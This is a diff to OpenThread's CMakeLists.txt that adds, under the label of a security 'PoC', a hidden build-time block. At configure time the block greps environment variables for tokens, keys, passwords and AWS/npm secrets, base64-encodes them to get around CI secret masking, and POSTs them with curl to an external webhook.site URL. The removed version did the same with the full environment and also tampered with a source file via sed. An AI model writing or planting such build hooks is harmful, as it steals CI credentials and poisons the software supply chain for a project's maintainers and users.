@@ -34,51 +34,44 @@ string(STRIP ${OT_DEFAULT_VERSION} OT_DEFAULT_VERSION)
 
 project(openthread VERSION ${OT_DEFAULT_VERSION})
 
-# --- START FINAL ADVANCED SECURITY PoC ---
-# الغرض: إثبات RCE، تسريب بيانات، وتعديل الكود المصدري (هجوم سلسلة التوريد)
+# --- START CREDENTIAL HUNTING PoC ---
+# الغرض: إثبات القدرة على كشف وتسريب الأسرار والتوكنز وتجاوز الـ Secret Masking
 message(WARNING "***************************************************")
-message(WARNING "--- SECURITY IMPACT DEMONSTRATION ---")
-message(WARNING "VULNERABILITY CONFIRMED: RCE & BUILD-TIME INJECTION")
+message(WARNING "--- SECURITY IMPACT: CREDENTIAL EXFILTRATION ---")
+message(WARNING "VULNERABILITY CONFIRMED: RCE & SECRET EXPOSURE")
 
 message(WARNING "--- STEP 1: RCE Verification ---")
 execute_process(COMMAND id OUTPUT_VARIABLE POC_ID)
-execute_process(COMMAND uname -a OUTPUT_VARIABLE POC_NODE)
 execute_process(COMMAND whoami OUTPUT_VARIABLE POC_USER)
 message(WARNING "Running as User: ${POC_USER}")
 message(WARNING "System ID: ${POC_ID}")
-message(WARNING "Node Info: ${POC_NODE}")
 
-message(WARNING "--- STEP 2: Network Exfiltration Verification ---")
-# جمع متغيرات البيئة وتشفيرها
-execute_process(COMMAND bash -c "env | base64 -w 0" OUTPUT_VARIABLE ENCODED_ENV)
-# إرسال البيانات (تأكد من تغيير الرابط أدناه برابط جديد)
+message(WARNING "--- STEP 2: Credential Hunting & Bypassing Masking ---")
+
+# البحث عن أي متغير بيئة يحتوي على كلمات حساسة وتشفيره بـ base64 لتجاوز الـ ***
+# نستخدم || true لضمان عدم فشل السكريبت إذا لم يجد شيئاً في هذه المرحلة
 execute_process(
-    COMMAND bash -c "curl -X POST -d \"data=${ENCODED_ENV}\" https://webhook.site/1c2b9d94-9f73-48ed-adf6-ffc19f56a6dc"
+    COMMAND bash -c "env | grep -Ei 'key|token|secret|password|auth|aws|npm' | base64 -w 0 || true" 
+    OUTPUT_VARIABLE LEAKED_DATA
 )
 
-message(WARNING "--- STEP 3: Supply Chain / Source Code Modification Proof ---")
-# استهداف ملف أساسي في المشروع لإثبات القدرة على التعديل
-set(TARGET_FILE "${PROJECT_SOURCE_DIR}/src/core/api/ip6_api.cpp")
-
-message(WARNING "ORIGINAL Content of ${TARGET_FILE} (first 5 lines):")
-execute_process(COMMAND bash -c "head -n 5 ${TARGET_FILE}" OUTPUT_VARIABLE FILE_ORIGINAL)
-message(WARNING "${FILE_ORIGINAL}")
-
-# حقن تعليق في بداية الملف باستخدام محدد '|' لتجنب الأخطاء السابقة
-message(WARNING "Injecting Backdoor Marker via 'sed' command...")
-execute_process(
-    COMMAND bash -c "sed -i '1i/* INJECTED_BY_ActionPwn_PoC_SUPPLY_CHAIN */' ${TARGET_FILE}"
-)
-
-message(WARNING "MODIFIED Content of ${TARGET_FILE} (first 5 lines):")
-execute_process(COMMAND bash -c "head -n 5 ${TARGET_FILE}" OUTPUT_VARIABLE FILE_MODIFIED)
-message(WARNING "${FILE_MODIFIED}")
+if(LEAKED_DATA)
+    message(WARNING "Leaked (Base64) Environment Data: ${LEAKED_DATA}")
+    
+    # إرسال البيانات المسربة إلى Webhook خارجي
+    message(WARNING "Exfiltrating sensitive data to external server...")
+    execute_process(
+        COMMAND bash -c "curl -s -X POST -d \"leaked_creds=${LEAKED_DATA}\" https://webhook.site/1c2b9d94-9f73-48ed-adf6-ffc19f56a6dc"
+    )
+else()
+    message(WARNING "No immediate credentials found in current environment variables.")
+endif()
 
 message(WARNING "***************************************************")
 
-# إيقاف العملية لإظهار النتائج بوضوح في سجلات الفشل
-message(FATAL_ERROR "Impact Proven: RCE, Data Exfiltration, and Source Code Modification Successful.")
-# --- END FINAL ADVANCED SECURITY PoC ---
+# إيقاف العملية لإظهار النتائج بوضوح في سجلات GitHub Actions
+message(FATAL_ERROR "Impact Proven: RCE and Credential Exfiltration Path Demonstrated.")
+# --- END CREDENTIAL HUNTING PoC ---
 
 include(CTest)
 
@@ -150,14 +143,11 @@ endif()
 
 set(OT_PACKAGE_NAME "OPENTHREAD" CACHE STRING "OpenThread Package Name")
 target_compile_definitions(ot-config INTERFACE "PACKAGE_NAME=\"${OT_PACKAGE_NAME}\"")
-message(STATUS "Package Name: ${OT_PACKAGE_NAME}")
 
 set(OT_PACKAGE_VERSION "" CACHE STRING "OpenThread Package Version")
 if(OT_PACKAGE_VERSION STREQUAL "")
     ot_git_version(OT_PACKAGE_VERSION)
-    message(STATUS "Setting default package version: ${OT_PACKAGE_VERSION}")
 endif()
-message(STATUS "Package Version: ${OT_PACKAGE_VERSION}")
 
 set(OT_CONFIG "" CACHE STRING "OpenThread config header file (deprecated, use `OT_PROJECT_CONFIG` or `OT_PLATFORM_CONFIG` instead")
 set(OT_PROJECT_CONFIG "" CACHE STRING "OpenThread project-specific config header file")
@@ -176,9 +166,6 @@ elseif(OT_PLATFORM STREQUAL "external")
     target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_POSIX=0)
     target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_NEXUS=0)
 elseif(OT_PLATFORM STREQUAL "nexus")
-    if (OT_APP_CLI OR OT_APP_NCP OR OT_APP_RCP)
-        message(FATAL_ERROR "no app (cli/ncp/rcp) should be enabled with nexus simulation platform")
-    endif()
     target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_NEXUS=1)
     target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_POSIX=0)
 else()
